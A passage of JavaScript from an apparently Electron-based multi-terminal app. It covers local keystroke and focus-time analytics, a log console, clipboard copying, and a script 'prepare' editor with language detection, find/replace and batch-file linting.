  elements.analyticsTerminalList.textContent = "";

  for (const terminal of state.terminals.values()) {
    const record = ensureTerminalAnalyticsRecord(terminal);
    const row = document.createElement("div");
    row.className = "analytics-terminal-row";
    row.classList.toggle("is-focused", state.analyticsRuntime.focusedTerminalId === terminal.id);
    row.setAttribute("role", "listitem");
    const identity = document.createElement("div");
    identity.className = "analytics-terminal-identity";
    const indicator = document.createElement("i");
    indicator.setAttribute("aria-hidden", "true");
    const title = document.createElement("span");
    title.textContent = terminal.titleInput.value || record.title || "Terminal";
    identity.append(indicator, title);
    const metrics = document.createElement("div");
    metrics.className = "analytics-terminal-metrics";
    const keys = document.createElement("span");
    keys.textContent = `${formatStatisticCount(record.keystrokes)} keys`;
    const focus = document.createElement("span");
    focus.textContent = formatAnalyticsDuration(record.focusMs + pendingTerminalAnalyticsFocus(terminal.id));
    metrics.append(keys, focus);
    row.append(identity, metrics);
    elements.analyticsTerminalList.append(row);
  }
  elements.analyticsEmpty.hidden = state.terminals.size > 0;
}

function resetTerminalAnalytics() {
  if (!window.confirm("Reset all keystroke and terminal focus analytics?")) return false;
  const focusedTerminalId = state.analyticsRuntime.focusedTerminalId;
  state.analytics = emptyTerminalAnalytics();
  for (const terminal of state.terminals.values()) ensureTerminalAnalyticsRecord(terminal);
  state.analyticsRuntime.focusStartedAt = focusedTerminalId ? performance.now() : 0;
  state.analyticsRuntime.ticksSinceSave = 0;
  saveTerminalAnalytics();
  renderTerminalAnalytics();
  toast("Terminal analytics reset", "success", 1800);
  return true;
}

function ensureAnalyticsCurrentDay() {
  const dayKey = analyticsDayKey();
  if (state.analytics.dayKey === dayKey) return false;
  state.analytics.dayKey = dayKey;
  state.analytics.todayFocusMs = 0;
  state.analytics.todayKeystrokes = 0;
  scheduleTerminalAnalyticsSave();
  return true;
}

function ensureTerminalAnalyticsRecord(terminal) {
  if (!terminal) return null;
  let record = state.analytics.terminals[terminal.id];
  if (!record) {
    record = {
      focusMs: 0,
      keystrokes: 0,
      startedAt: terminal.startedAt || new Date().toISOString(),
      title: terminal.titleInput?.value || "Terminal"
    };
    state.analytics.terminals[terminal.id] = record;
  } else {
    record.title = terminal.titleInput?.value || record.title || "Terminal";
    if (!record.startedAt && terminal.startedAt) record.startedAt = terminal.startedAt;
  }
  return record;
}

function scheduleTerminalAnalyticsSave() {
  if (state.analyticsRuntime.saveTimer) return;
  state.analyticsRuntime.saveTimer = window.setTimeout(() => {
    state.analyticsRuntime.saveTimer = 0;
    saveTerminalAnalytics();
  }, 750);
}

function recordTerminalAnalyticsKeystroke(terminal) {
  if (!terminal || !state.terminals.has(terminal.id)) return;
  ensureAnalyticsCurrentDay();
  const record = ensureTerminalAnalyticsRecord(terminal);
  record.keystrokes += 1;
  state.analytics.todayKeystrokes += 1;
  state.analytics.totalKeystrokes += 1;
  scheduleTerminalAnalyticsSave();
  renderTerminalAnalytics();
}

function checkpointTerminalAnalyticsFocus(now = performance.now()) {
  const runtime = state.analyticsRuntime;
  if (!runtime.focusedTerminalId || !runtime.focusStartedAt) return 0;
  const elapsed = Math.max(0, now - runtime.focusStartedAt);
  runtime.focusStartedAt = now;
  if (!elapsed) return 0;
  ensureAnalyticsCurrentDay();
  const terminal = state.terminals.get(runtime.focusedTerminalId);
  const record = terminal
    ? ensureTerminalAnalyticsRecord(terminal)
    : state.analytics.terminals[runtime.focusedTerminalId];
  if (!record) return 0;
  record.focusMs += elapsed;
  state.analytics.todayFocusMs += elapsed;
  state.analytics.totalFocusMs += elapsed;
  return elapsed;
}

function beginTerminalAnalyticsFocus(terminal) {
  if (!terminal || !state.terminals.has(terminal.id)) return;
  if (document.visibilityState !== "visible" || !document.hasFocus()) return;
  const runtime = state.analyticsRuntime;
  if (runtime.focusedTerminalId === terminal.id) return;
  checkpointTerminalAnalyticsFocus();
  ensureTerminalAnalyticsRecord(terminal);
  runtime.focusedTerminalId = terminal.id;
  runtime.focusStartedAt = performance.now();
  renderTerminalAnalytics();
}

function endTerminalAnalyticsFocus(terminalId = null) {
  const runtime = state.analyticsRuntime;
  if (!runtime.focusedTerminalId || (terminalId && runtime.focusedTerminalId !== terminalId)) return;
  checkpointTerminalAnalyticsFocus();
  runtime.focusedTerminalId = null;
  runtime.focusStartedAt = 0;
  saveTerminalAnalytics();
  renderTerminalAnalytics();
}

function reconcileTerminalAnalyticsFocus() {
  if (document.visibilityState !== "visible" || !document.hasFocus()) {
    endTerminalAnalyticsFocus();
    return;
  }
  const terminal = [...state.terminals.values()].find((candidate) => (
    candidate.term.element?.contains(document.activeElement)
  ));
  if (terminal) beginTerminalAnalyticsFocus(terminal);
  else endTerminalAnalyticsFocus();
}

function removeTerminalAnalyticsRecord(terminal) {
  if (!terminal) return;
  endTerminalAnalyticsFocus(terminal.id);
  delete state.analytics.terminals[terminal.id];
  saveTerminalAnalytics();
  renderTerminalAnalytics();
}

function pruneTerminalAnalyticsRecords() {
  let changed = false;
  for (const id of Object.keys(state.analytics.terminals)) {
    if (state.terminals.has(id)) continue;
    delete state.analytics.terminals[id];
    changed = true;
  }
  if (changed) saveTerminalAnalytics();
  renderTerminalAnalytics();
  return changed;
}

function bindTerminalAnalytics() {
  if (state.analyticsRuntime.ticker) return;
  elements.analyticsReset?.addEventListener("click", resetTerminalAnalytics);
  window.addEventListener("focus", reconcileTerminalAnalyticsFocus);
  window.addEventListener("blur", () => endTerminalAnalyticsFocus());
  document.addEventListener("visibilitychange", reconcileTerminalAnalyticsFocus);
  state.analyticsRuntime.ticker = window.setInterval(() => {
    if (state.analyticsRuntime.focusedTerminalId) {
      checkpointTerminalAnalyticsFocus();
      state.analyticsRuntime.ticksSinceSave += 1;
      if (state.analyticsRuntime.ticksSinceSave >= 5) {
        state.analyticsRuntime.ticksSinceSave = 0;
        saveTerminalAnalytics();
      }
    }
    renderTerminalAnalytics();
  }, 1000);
  reconcileTerminalAnalyticsFocus();
  renderTerminalAnalytics();
}

function shutdownTerminalAnalytics() {
  checkpointTerminalAnalyticsFocus();
  window.clearInterval(state.analyticsRuntime.ticker);
  window.clearTimeout(state.analyticsRuntime.saveTimer);
  state.analyticsRuntime.ticker = 0;
  state.analyticsRuntime.saveTimer = 0;
  saveTerminalAnalytics();
}

function normalizeTitleFontScale(value) {
  const requested = Number(value);
  return Number.isFinite(requested)
    ? Math.min(
        TITLE_FONT_SCALE_BOUNDS.max,
        Math.max(
          TITLE_FONT_SCALE_BOUNDS.min,
          Math.round(requested / TITLE_FONT_SCALE_BOUNDS.step) * TITLE_FONT_SCALE_BOUNDS.step
        )
      )
    : TITLE_FONT_SCALE_BOUNDS.fallback;
}

function normalizeHeaderActionDragScope(value) {
  return value === "all" || value === "terminal" ? value : "ask";
}

function normalizePageCloseAction(value) {
  return value === "move" || value === "close" ? value : "ask";
}

function normalizeHeaderActionsInMenu(value) {
  const source = Array.isArray(value) ? value : DEFAULT_HEADER_ACTIONS_IN_MENU;
  return HEADER_ACTION_IDS.filter((action) => source.includes(action));
}

function normalizeHeaderActionOverrides(value) {
  if (!value || typeof value !== "object" || Array.isArray(value)) return {};
  return Object.fromEntries(Object.entries(value).filter(([action, placement]) => (
    HEADER_ACTION_ID_SET.has(action) && (placement === "header" || placement === "menu")
  )));
}

function normalizeNotificationOverrides(value) {
  if (!value || typeof value !== "object" || Array.isArray(value)) return {};
  return Object.fromEntries(Object.keys(TERMINAL_NOTIFICATION_SETTINGS)
    .filter((channel) => typeof value[channel] === "boolean")
    .map((channel) => [channel, value[channel]]));
}

function terminalNotificationEnabled(terminal, channel) {
  const override = terminal?.notificationOverrides?.[channel];
  if (typeof override === "boolean") return override;
  return Boolean(state.settings[TERMINAL_NOTIFICATION_SETTINGS[channel]]);
}

function saveSettings() {
  localStorage.setItem("multiterm.settings", JSON.stringify(state.settings));
}

function loadManualLayouts() {
  try {
    return JSON.parse(localStorage.getItem("multiterm.manualLayouts") || "{}");
  } catch {
    return {};
  }
}

function saveManualLayouts() {
  localStorage.setItem("multiterm.manualLayouts", JSON.stringify(state.manualLayouts));
}

function createId() {
  if (window.crypto?.randomUUID) {
    return window.crypto.randomUUID();
  }
  return `terminal-${Date.now()}-${Math.random().toString(16).slice(2)}`;
}

// lucide's replaceElement copies data-lucide onto the <svg> it generates, so the
// generated icon keeps matching the selector and a plain createIcons() destroys
// and rebuilds every icon in the document on every call — measured at 353 SVGs
// per call with 13 panes open, from ~20 call sites. Restrict the scan to
// unresolved placeholders (and, where the caller knows it, to the subtree that
// actually changed) so the work is proportional to the new icons.
function refreshIcons(scope) {
  if (!window.lucide) return;
  const container = scope && typeof scope.querySelectorAll === "function" ? scope : document;
  window.lucide.createIcons({
    root: {
      querySelectorAll: (selector) => container.querySelectorAll(`${selector}:not(svg)`)
    }
  });
}

function applySnapLayout() {
  const snap = state.snap && state.terminals.has(state.snap.id) ? state.snap : null;

  if (!snap) {
    state.snap = null;
    delete elements.host.dataset.snapEdge;
    elements.host.style.removeProperty("--snap-rest-count");
    for (const terminal of state.terminals.values()) {
      terminal.pane.classList.remove("is-snapped", "is-snap-rest");
    }
    return;
  }

  elements.host.dataset.snapEdge = snap.edge;
  elements.host.style.setProperty("--snap-rest-count", Math.max(1, state.terminals.size - 1));

  for (const terminal of state.terminals.values()) {
    const isSnapped = terminal.id === snap.id;
    terminal.pane.classList.toggle("is-snapped", isSnapped);
    terminal.pane.classList.toggle("is-snap-rest", !isSnapped);
  }
}

/* ---------------- Ripple (Material) --------------- */

// Perf (Electron guideline #4): run low-priority, non-visual work during an idle
// period so it never competes with first paint, bridge connection, or input.
// Falls back to a short timeout where requestIdleCallback is unavailable.
function whenIdle(fn) {
  if (typeof window.requestIdleCallback === "function") {
    window.requestIdleCallback(() => fn(), { timeout: 1000 });
  } else {
    window.setTimeout(fn, 1);
  }
}

function attachRipples() {
  document.addEventListener("pointerdown", (event) => {
    if (event.button !== 0) return;
    const button = event.target.closest("button");
    if (!button || button.disabled) return;

    const rect = button.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height) * 2.2;
    const ripple = document.createElement("span");
    ripple.className = "ripple";
    ripple.style.width = `${size}px`;
    ripple.style.height = `${size}px`;
    ripple.style.left = `${event.clientX - rect.left - size / 2}px`;
    ripple.style.top = `${event.clientY - rect.top - size / 2}px`;
    button.appendChild(ripple);
    ripple.addEventListener("animationend", () => ripple.remove());
  });
}

/* ---------------- Toasts (Material snackbar) --------------- */

function toast(message, tone = "success", timeout = 3200) {
  if (!elements.toastHost) return;

  const el = document.createElement("div");
  el.className = `toast toast-${tone}`;
  el.textContent = message;
  elements.toastHost.append(el);
  window.requestAnimationFrame(() => el.classList.add("is-in"));

  const dismiss = () => {
    el.classList.remove("is-in");
    el.addEventListener("transitionend", () => el.remove(), { once: true });
  };

  const timer = window.setTimeout(dismiss, timeout);
  el.addEventListener("click", () => {
    window.clearTimeout(timer);
    dismiss();
  });
}

/* ---------------- Log console (tail view) --------------- */

function bindLogConsole() {
  if (!elements.logToggle) return;
  elements.logToggle.addEventListener("click", toggleLogPanel);
  elements.logClose.addEventListener("click", () => setLogPanel(false));
  elements.logClear.addEventListener("click", clearLogs);
  elements.logCopy.addEventListener("click", copyLogs);
  elements.logLevelFilter.value = logStore.minLevel;
  elements.logLevelFilter.addEventListener("change", () => {
    logStore.minLevel = elements.logLevelFilter.value;
    log.debug("ui", `Log filter set to ${logStore.minLevel}+`);
    renderAllLogs();
  });
  elements.logOutput.addEventListener("scroll", () => {
    const out = elements.logOutput;
    logStore.autoscroll = out.scrollTop + out.clientHeight >= out.scrollHeight - 24;
  });
}

function toggleLogPanel() {
  if (blockFullscreenSurfaceAction("logs")) return;
  setLogPanel(elements.logPanel.hidden);
}

function setLogPanel(open) {
  if (!elements.logPanel) return;
  updateLogPanelVisibility(open);
  if (open) {
    logStore.unseenError = false;
    if (elements.logToggleDot) elements.logToggleDot.hidden = true;
    logStore.autoscroll = true;
    renderAllLogs();
    scrollLogToEnd();
    log.debug("ui", "Log console opened");
  }
}

function updateLogPanelVisibility(open) {
  elements.logPanel.hidden = !open;
  // The toggle lives in the status bar now, so it stays put and flips its
  // chevron instead of vanishing - hiding it would collapse a slot in the bar
  // and shuffle the controls beside it every time the panel opened.
  elements.logToggle.setAttribute("aria-expanded", String(open));
  const label = open ? "Hide logs" : "Show logs";
  elements.logToggle.title = label;
  elements.logToggle.setAttribute("aria-label", label);
}

function passesLogFilter(entry) {
  return LOG_LEVEL_RANK[entry.level] >= LOG_LEVEL_RANK[logStore.minLevel];
}

function formatLogTime(time) {
  const date = new Date(time);
  const pad = (value, length = 2) => String(value).padStart(length, "0");
  return `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}.${pad(date.getMilliseconds(), 3)}`;
}

function safeLogDetail(detail) {
  if (typeof detail === "string") return detail;
  try {
    return JSON.stringify(detail);
  } catch {
    return String(detail);
  }
}

function buildLogRow(entry) {
  const row = document.createElement("div");
  row.className = `log-row log-${entry.level}`;
  row.dataset.id = entry.id;

  const time = document.createElement("span");
  time.className = "log-time";
  time.textContent = formatLogTime(entry.time);

  const level = document.createElement("span");
  level.className = "log-level";
  level.textContent = entry.level;

  const source = document.createElement("span");
  source.className = "log-source";
  source.textContent = entry.source;

  const message = document.createElement("span");
  message.className = "log-msg";
  message.textContent = entry.detail !== undefined
    ? `${entry.message}  ${safeLogDetail(entry.detail)}`
    : entry.message;

  row.append(time, level, source, message);
  return row;
}

function appendLogRow(entry) {
  const out = elements.logOutput;
  if (!out || !elements.logPanel || elements.logPanel.hidden) return;
  if (!passesLogFilter(entry)) return;

  const empty = out.querySelector(".log-empty");
  if (empty) empty.remove();

  out.append(buildLogRow(entry));
  while (out.childElementCount > logStore.max) {
    out.firstElementChild.remove();
  }
  if (logStore.autoscroll) scrollLogToEnd();
}

function renderAllLogs() {
  const out = elements.logOutput;
  if (!out) return;

  out.textContent = "";
  const visible = logStore.entries.filter(passesLogFilter);
  if (visible.length === 0) {
    const empty = document.createElement("div");
    empty.className = "log-empty";
    empty.textContent = "No log entries at this level yet.";
    out.append(empty);
    return;
  }

  const fragment = document.createDocumentFragment();
  for (const entry of visible) {
    fragment.append(buildLogRow(entry));
  }
  out.append(fragment);
  if (logStore.autoscroll) scrollLogToEnd();
}

function scrollLogToEnd() {
  const out = elements.logOutput;
  if (out) out.scrollTop = out.scrollHeight;
}

function clearLogs() {
  logStore.entries = [];
  renderAllLogs();
  log.info("ui", "Log console cleared");
}

function copyLogs() {
  const text = logStore.entries
    .filter(passesLogFilter)
    .map((entry) => {
      const detail = entry.detail !== undefined ? `  ${safeLogDetail(entry.detail)}` : "";
      return `${formatLogTime(entry.time)} [${entry.level}] [${entry.source}] ${entry.message}${detail}`;
    })
    .join("\n");

  if (!text) {
    toast("No logs to copy", "info", 1600);
    return;
  }
  writeClipboardText(text).then(
    () => toast("Logs copied", "success", 1600),
    () => toast("Copy failed", "error", 1800)
  );
}

function ingestServerLog(message) {
  logEvent(message.level, message.source || "server", message.message || "", null);
}

/* ---------------- Per-pane actions --------------- */

function clearTerminal(id) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;
  terminal.term.clear();
  terminal.searchText = "";
  terminal.searchTextStale = false;
  refreshTerminalSearchText(terminal);
}

function clearActiveTerminal() {
  if (state.activeId) clearTerminal(state.activeId);
}

function terminalBufferText(term) {
  const buffer = term.buffer.active;
  const lines = [];
  for (let i = 0; i < buffer.length; i += 1) {
    const line = buffer.getLine(i);
    if (line) lines.push(line.translateToString(true));
  }
  return lines.join("\n").replace(/\s+$/, "");
}

async function copyTerminalOutput(id, selectionOverride) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;

  const selection = selectionOverride === undefined ? terminal.term.getSelection() : selectionOverride;
  const text = selection || terminalBufferText(terminal.term);
  if (!text) {
    toast("Nothing to copy", "info", 1800);
    return;
  }

  try {
    await writeClipboardText(text);
    toast(selection ? "Selection copied" : "Output copied", "success", 1800);
  } catch {
    toast("Clipboard unavailable", "error");
  }
}

function writeClipboardText(text) {
  if (window.multiterm?.writeClipboardText) {
    return window.multiterm.writeClipboardText(text);
  }
  if (!navigator.clipboard?.writeText) {
    return Promise.reject(new Error("Clipboard write access is unavailable."));
  }
  return navigator.clipboard.writeText(text);
}

const PREPARE_FILE_NAMES = {
  powershell: "prepared.ps1",
  batch: "prepared.cmd",
  csharp: "Prepared.cs",
  text: "prepared.txt"
};

function prepareLanguageForTerminal(_terminal, text) {
  const source = String(text || "");
  if (/^\s*(?:using\s+[\w.]+\s*;|namespace\s+[\w.]+|(?:(?:public|internal|private|protected)\s+)?(?:static\s+)?(?:class|record|struct|interface|enum)\s+\w+|static\s+void\s+Main\s*\()/m.test(source)) {
    return "csharp";
  }
  if (/^\s*(?:@?echo\s+off\b|rem(?:\s|$)|::|:[A-Za-z_][\w.-]*\s*$|(?:setlocal|endlocal|goto|shift)(?:\s|$)|call\s+:[^\s]+|if\s+(?:not\s+)?(?:exist|errorlevel|defined)\b|for\s+%%[A-Za-z]\b)/im.test(source)
      || /%[A-Za-z_][A-Za-z0-9_]*%/.test(source)) {
    return "batch";
  }
  if (/^\s*(?:#requires\b|(?:param|dynamicparam|begin|process|end)\s*\(|\[(?:CmdletBinding|Parameter)(?:\]|\())/im.test(source)
      || /\$[A-Za-z_][A-Za-z0-9_]*\s*=|\$env:[A-Za-z_]|\$_(?:\b|\.)/i.test(source)
      || /\b(?:Add|Clear|Compare|Compress|ConvertFrom|ConvertTo|Copy|Disable|Enable|Enter|Exit|Export|Find|Format|ForEach|Get|Group|Import|Invoke|Join|Measure|Move|New|Out|Pop|Push|Read|Receive|Register|Remove|Rename|Resolve|Restart|Save|Select|Send|Set|Show|Sort|Split|Start|Stop|Test|Unregister|Update|Wait|Where|Write)-[A-Za-z][A-Za-z0-9]*\b/i.test(source)) {
    return "powershell";
  }
  return "text";
}

function setPrepareValidation(label, kind = "") {
  elements.prepareValidation.textContent = label;
  elements.prepareValidation.classList.toggle("prepare-validation-ok", kind === "ok");
  elements.prepareValidation.classList.toggle("prepare-validation-error", kind === "error");
}

function updatePrepareStatus() {
  const editor = elements.prepareText;
  const before = editor.value.slice(0, editor.selectionStart);
  const lines = before.split("\n");
  const line = lines.length;
  const column = lines[lines.length - 1].length + 1;
  const totalLines = editor.value ? editor.value.split("\n").length : 1;
  elements.prepareStatus.textContent = `Ln ${line}, Col ${column}  \u00b7  ${totalLines} lines  \u00b7  ${editor.value.length} chars`;
}

function updatePrepareLineNumbers() {
  if (elements.prepareOverlay.hidden) return;
  const editorStyle = window.getComputedStyle(elements.prepareText);
  const lineHeight = Number.parseFloat(editorStyle.lineHeight) || 20;
  const horizontalPadding = (Number.parseFloat(editorStyle.paddingLeft) || 0)
    + (Number.parseFloat(editorStyle.paddingRight) || 0);
  const contentWidth = Math.max(1, elements.prepareText.clientWidth - horizontalPadding);
  const wrapped = state.prepareEditor.wordWrap;
  elements.prepareLineMeasure.style.width = `${contentWidth}px`;
  elements.prepareLineMeasure.style.whiteSpace = wrapped ? "pre-wrap" : "pre";
  elements.prepareLineMeasure.style.overflowWrap = wrapped ? "break-word" : "normal";

  const fragment = document.createDocumentFragment();
  const lines = elements.prepareText.value.replace(/\r\n?/g, "\n").split("\n");
  lines.forEach((line, index) => {
    elements.prepareLineMeasure.textContent = line || "\u200b";
    const number = document.createElement("div");
    number.className = "prepare-line-number";
    number.textContent = String(index + 1);
    number.style.height = `${wrapped ? Math.max(lineHeight, elements.prepareLineMeasure.scrollHeight) : lineHeight}px`;
    fragment.append(number);
  });
  elements.prepareLineNumbers.replaceChildren(fragment);
  elements.prepareLineNumbers.scrollTop = elements.prepareText.scrollTop;
}

function schedulePrepareLineNumbers() {
  if (state.prepareEditor.lineNumbersFrame) window.cancelAnimationFrame(state.prepareEditor.lineNumbersFrame);
  state.prepareEditor.lineNumbersFrame = window.requestAnimationFrame(() => {
    state.prepareEditor.lineNumbersFrame = 0;
    updatePrepareLineNumbers();
  });
}

function setPrepareWordWrap(enabled) {
  state.prepareEditor.wordWrap = Boolean(enabled);
  elements.prepareEditSurface.classList.toggle("is-wrapped", state.prepareEditor.wordWrap);
  elements.prepareText.wrap = state.prepareEditor.wordWrap ? "soft" : "off";
  elements.prepareWrap.setAttribute("aria-pressed", String(state.prepareEditor.wordWrap));
  elements.prepareWrap.title = state.prepareEditor.wordWrap ? "Disable word wrap" : "Enable word wrap";
  schedulePrepareLineNumbers();
}

function createPrepareResizeObserver(Observer = globalThis.ResizeObserver) {
  if (typeof Observer !== "function") return null;
  const observer = new Observer(schedulePrepareLineNumbers);
  observer.observe(elements.prepareEditSurface);
  return observer;
}

function prepareEditorFocusableElements() {
  return [...elements.prepareOverlay.querySelectorAll(
    'button:not([disabled]), input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
  )].filter((element) => !element.hidden && element.offsetParent !== null);
}

function setPrepareEditorMode(mode) {
  const isPaste = mode === "paste";
  state.prepareEditor.mode = isPaste ? "paste" : "copy";
  elements.prepareTitle.textContent = isPaste ? "Prepare and paste" : "Copy and prepare";
  elements.prepareCopy.textContent = "";
  const icon = document.createElement("i");
  icon.dataset.lucide = isPaste ? "clipboard-paste" : "clipboard-copy";
  const label = document.createElement("span");
  label.textContent = isPaste ? "Paste" : "Copy";
  elements.prepareCopy.append(icon, label);
  refreshIcons(elements.prepareCopy);
}

function openPrepareEditor(text, sourceTerminalId = null, mode = "copy") {
  if (!elements.prepareOverlay || typeof text !== "string" || !text) return;
  window.clearTimeout(state.prepareEditor.closeTimer);
  state.prepareEditor.closeTimer = 0;
  closePalette();
  hideContextMenu();
  const source = state.terminals.get(sourceTerminalId);
  state.prepareEditor.returnFocus = document.activeElement instanceof HTMLElement ? document.activeElement : null;
  state.prepareEditor.sourceTerminalId = source?.id || null;
  state.prepareEditor.validating = false;
  setPrepareEditorMode(mode);
  const language = prepareLanguageForTerminal(source, text);
  elements.prepareText.value = text;
  setPrepareWordWrap(true);
  elements.prepareLanguage.value = language;
  elements.prepareFileName.value = PREPARE_FILE_NAMES[language];
  elements.prepareSnippetName.value = "";
  elements.prepareSource.textContent = state.prepareEditor.mode === "paste"
    ? `Clipboard text will paste into ${source?.titleInput.value || "the focused terminal"} without Enter after editing.`
    : source
      ? `Selected from ${source.titleInput.value || "Terminal"}. Changes stay here until you choose an action.`
      : "Edit selected terminal text before using it.";
  elements.prepareFind.value = "";
  elements.prepareReplace.value = "";
  elements.prepareFindBar.hidden = true;
  elements.prepareTerminalFlyout.hidden = true;
  elements.prepareSend.setAttribute("aria-expanded", "false");
  elements.prepareIssues.hidden = true;
  elements.prepareIssues.textContent = "";
  setPrepareValidation("Not checked");
  elements.prepareText.setSelectionRange(0, 0);
  updatePrepareStatus();
  document.querySelector(".app-shell").inert = true;
  elements.prepareOverlay.hidden = false;
  window.requestAnimationFrame(() => {
    elements.prepareOverlay.classList.add("is-open");
    schedulePrepareLineNumbers();
  });
  elements.prepareText.focus();
}

function closePrepareEditor({ restoreFocus = true } = {}) {
  if (!elements.prepareOverlay) return;
  const returnFocus = state.prepareEditor.returnFocus;
  state.prepareEditor.returnFocus = null;
  state.prepareEditor.sourceTerminalId = null;
  state.prepareEditor.validating = false;
  elements.prepareOverlay.classList.remove("is-open");
  window.clearTimeout(state.prepareEditor.closeTimer);
  state.prepareEditor.closeTimer = window.setTimeout(() => {
    state.prepareEditor.closeTimer = 0;
    if (!elements.prepareOverlay.classList.contains("is-open")) {
      elements.prepareOverlay.hidden = true;
      document.querySelector(".app-shell").inert = false;
      if (restoreFocus && returnFocus?.isConnected) returnFocus.focus({ preventScroll: true });
    }
  }, 150);
}

function togglePrepareFind(force) {
  const open = force === undefined ? elements.prepareFindBar.hidden : Boolean(force);
  elements.prepareFindBar.hidden = !open;
  if (open) {
    const selected = elements.prepareText.value.slice(elements.prepareText.selectionStart, elements.prepareText.selectionEnd);
    if (selected && !selected.includes("\n")) elements.prepareFind.value = selected;
    elements.prepareFind.focus();
    elements.prepareFind.select();
  } else {
    elements.prepareText.focus();
  }
}

function findPreparedText(direction = 1) {
  const query = elements.prepareFind.value;
  const text = elements.prepareText.value;
  if (!query || !text) return false;
  const haystack = text.toLocaleLowerCase();
  const needle = query.toLocaleLowerCase();
  const start = direction > 0 ? elements.prepareText.selectionEnd : elements.prepareText.selectionStart - 1;
  let index = direction > 0 ? haystack.indexOf(needle, start) : haystack.lastIndexOf(needle, start);
  if (index < 0) index = direction > 0 ? haystack.indexOf(needle) : haystack.lastIndexOf(needle);
  if (index < 0) {
    toast("No match", "info", 1200);
    return false;
  }
  elements.prepareText.focus();
  elements.prepareText.setSelectionRange(index, index + query.length);
  updatePrepareStatus();
  return true;
}

function replacePreparedText() {
  const editor = elements.prepareText;
  const query = elements.prepareFind.value;
  let selected = editor.value.slice(editor.selectionStart, editor.selectionEnd);
  if (!query) return false;
  if (selected.toLocaleLowerCase() !== query.toLocaleLowerCase()) {
    if (!findPreparedText(1)) return false;
    selected = editor.value.slice(editor.selectionStart, editor.selectionEnd);
  }
  editor.setRangeText(elements.prepareReplace.value, editor.selectionStart, editor.selectionEnd, "end");
  preparedTextChanged();
  findPreparedText(1);
  return true;
}

function replaceAllPreparedText() {
  const query = elements.prepareFind.value;
  if (!query) return 0;
  const matcher = new RegExp(query.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi");
  let count = 0;
  elements.prepareText.value = elements.prepareText.value.replace(matcher, () => {
    count += 1;
    return elements.prepareReplace.value;
  });
  preparedTextChanged();
  toast(count ? `Replaced ${count} match${count === 1 ? "" : "es"}` : "No match", count ? "success" : "info", 1400);
  return count;
}

function cleanPreparedCopilotBorders() {
  let count = 0;
  elements.prepareText.value = elements.prepareText.value.split("\n").map((line) => {
    const cleaned = line.replace(/[ \t]*\|[ \t]*$/, "");
    if (cleaned !== line) count += 1;
    return cleaned;
  }).join("\n");
  preparedTextChanged();
  elements.prepareText.focus();
  toast(
    count ? `Removed ${count} trailing Copilot border${count === 1 ? "" : "s"}` : "No trailing Copilot borders found",
    count ? "success" : "info",
    1800
  );
  return count;
}

function indentPreparedText(outdent = false) {
  const editor = elements.prepareText;
  const start = editor.selectionStart;
  const end = editor.selectionEnd;
  if (start === end && !outdent) {
    editor.setRangeText("    ", start, end, "end");
    preparedTextChanged();
    return;
  }
  const lineStart = editor.value.lastIndexOf("\n", Math.max(0, start - 1)) + 1;
  const selected = editor.value.slice(lineStart, end);
  const lines = selected.split("\n");
  const changed = lines.map((line) => outdent ? line.replace(/^(?: {1,4}|\t)/, "") : `    ${line}`).join("\n");
  editor.setRangeText(changed, lineStart, end, "select");
  editor.setSelectionRange(lineStart, lineStart + changed.length);
  preparedTextChanged();
}

function preparedTextChanged() {
  setPrepareValidation("Not checked");
  elements.prepareIssues.hidden = true;
  elements.prepareIssues.textContent = "";
  updatePrepareStatus();
  schedulePrepareLineNumbers();
}

function prepareLineOffset(text, line, column) {
  const lines = String(text).split("\n");
  let offset = 0;
  const targetLine = Math.max(1, Math.min(Number(line) || 1, lines.length));
  for (let index = 0; index < targetLine - 1; index += 1) offset += lines[index].length + 1;
  return offset + Math.max(0, Math.min((Number(column) || 1) - 1, lines[targetLine - 1].length));
}

function renderPrepareIssues(result) {
  const issues = Array.isArray(result?.issues) ? result.issues : [];
  elements.prepareIssues.textContent = "";
  if (issues.length === 0) {
    elements.prepareIssues.hidden = true;
    setPrepareValidation(result?.error || `No syntax issues (${result?.engine || "check"})`, result?.error ? "error" : "ok");
    return;
  }
  for (const issue of issues) {
    const row = document.createElement("li");
    row.className = "prepare-issue";
    const location = document.createElement("button");
    location.type = "button";
    location.textContent = `Ln ${Math.max(1, Number(issue.line) || 1)}:${Math.max(1, Number(issue.column) || 1)}`;
    location.addEventListener("click", () => {
      const offset = prepareLineOffset(elements.prepareText.value, issue.line, issue.column);
      elements.prepareText.focus();
      elements.prepareText.setSelectionRange(offset, offset);
      updatePrepareStatus();
    });
    const message = document.createElement("span");
    message.className = "prepare-issue-message";
    message.textContent = String(issue.message || "Syntax issue");
    const code = document.createElement("span");
    code.className = "prepare-issue-code";
    code.textContent = String(issue.code || issue.severity || "");
    row.append(location, message, code);
    elements.prepareIssues.append(row);
  }
  elements.prepareIssues.hidden = false;
  setPrepareValidation(`${issues.length} issue${issues.length === 1 ? "" : "s"} (${result?.engine || "check"})`, "error");
}

function lintBatchText(text) {
  const issues = [];
  const labels = new Map();
  const references = [];
  const lines = String(text).replace(/\r\n?/g, "\n").split("\n");
  let parentheses = 0;

  lines.forEach((line, index) => {
    const lineNumber = index + 1;
    const trimmed = line.trim();
    const label = /^:([^:\s][^\s]*)/.exec(trimmed);
    if (label) labels.set(label[1].toLocaleLowerCase(), lineNumber);
    if (!trimmed || /^::/.test(trimmed) || /^rem(?:\s|$)/i.test(trimmed)) return;

    let quoted = false;
    for (let column = 0; column < line.length; column += 1) {
      const character = line[column];
      if (character === "^") {
        column += 1;
      } else if (character === '"') {
        quoted = !quoted;
      } else if (!quoted && character === "(") {
        parentheses += 1;
      } else if (!quoted && character === ")") {
        parentheses -= 1;
        if (parentheses < 0) {
          issues.push({ line: lineNumber, column: column + 1, code: "CMD001", severity: "error", message: "Closing parenthesis has no matching opening parenthesis." });
          parentheses = 0;
        }
      }
    }
    if (quoted) issues.push({ line: lineNumber, column: line.length, code: "CMD002", severity: "warning", message: "Double quote is not closed on this line." });

    const goto = /\bgoto\s+(?!:eof\b):?([^\s&|<>]+)/i.exec(line);
    if (goto) references.push({ name: goto[1], line: lineNumber, column: goto.index + 1 });
    const call = /\bcall\s+:([^\s&|<>]+)/i.exec(line);
    if (call) references.push({ name: call[1], line: lineNumber, column: call.index + 1 });
  });

  if (parentheses > 0) {
